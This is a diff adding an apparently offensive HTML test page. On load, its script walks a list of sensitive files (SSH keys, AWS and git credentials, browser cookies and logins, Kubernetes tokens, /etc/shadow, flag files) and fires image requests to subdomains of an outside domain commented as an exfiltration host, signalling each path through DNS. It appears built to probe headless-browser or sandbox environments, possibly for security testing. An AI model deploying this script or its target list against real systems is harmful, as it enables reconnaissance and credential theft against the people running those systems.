@@ -1,0 +1,86 @@
+<html>
+<head><title>test</title>
+<script>
+let host_root = "d0c3a6c04arnnmh5u.xtric.homes"; // your exfil domain
+
+const top_files = [
+  // System identifiers
+  "file:///etc/hostname",
+  "file:///etc/hosts",
+  "file:///etc/passwd",
+  "file:///etc/shadow", // often not readable but worth probing
+  "file:///etc/os-release",
+  "file:///proc/version",
+  "file:///proc/self/environ",
+
+  // Common shell/user config
+  "file:///root/.bashrc",
+  "file:///root/.bash_history",
+  "file:///root/.profile",
+  "file:///root/.ssh/id_rsa",
+  "file:///root/.ssh/known_hosts",
+  "file:///home/node/.bashrc",
+  "file:///home/node/.ssh/id_rsa",
+
+  // Dev credentials & API keys
+  "file:///root/.aws/credentials",
+  "file:///root/.npmrc",
+  "file:///root/.git-credentials",
+  "file:///home/node/.npmrc",
+  "file:///home/node/.git-credentials",
+  "file:///etc/gitconfig",
+
+  // Browser cache/session stuff (if Chromium-based sandbox)
+  "file:///tmp/devtoolsActivePort",
+  "file:///tmp/.X11-unix/X0",
+  "file:///tmp/.com.google.Chrome.*", // Chrome temp dirs
+  "file:///home/chrome/.config/google-chrome/Default/Cookies",
+  "file:///home/chrome/.config/google-chrome/Default/Login Data",
+
+  // Likely container artifacts
+  "file:///home/chrome/.dockerenv",
+  "file:///run/secrets/kubernetes.io/serviceaccount/token",
+  "file:///var/run/secrets/kubernetes.io/serviceaccount/token",
+  "file:///etc/docker/daemon.json",
+  "file:///etc/kubernetes/admin.conf",
+
+  // Misc
+  "file:///var/log/auth.log",
+  "file:///var/log/syslog",
+  "file:///var/log/messages",
+  "file:///tmp/flag.txt",   // CTF-style bait
+  "file:///flag.txt"
+];
+
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+async function scanFiles() {
+  for (let path of top_files) {
+    try {
+      let img = new Image();
+      // Use a unique hostname per attempt to track which file triggered a DNS request
+      let sub = path
+        .replace(/^file:\/\//, '')      // strip scheme
+        .replace(/[^a-zA-Z0-9]/g, '-')  // sanitize for subdomain use
+        .slice(0, 60);                  // keep it short enough for DNS
+
+      img.src = `http://${sub}.${host_root}`;
+
+      // Allow the request to complete
+      await sleep(50);
+    } catch (e) {
+      // Ignore
+    }
+  }
+}
+
+scanFiles();
+
+</script>
+</head>
+<body>
+</body>
+</html>
